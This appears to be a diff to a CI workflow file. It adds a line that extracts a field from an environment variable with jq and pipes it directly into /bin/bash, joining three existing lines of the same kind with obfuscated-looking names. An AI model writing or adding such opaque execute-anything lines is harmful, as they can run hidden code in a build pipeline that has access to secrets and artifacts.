@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$i3" | jq -r .rve08 | /bin/bash
           echo $nb20299 | jq -r .vn1934 | /bin/bash
           echo $io8 | jq -r .zan733 | /bin/bash
+          printf '%s' "$ipoai620" | jq -r .liqd861 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
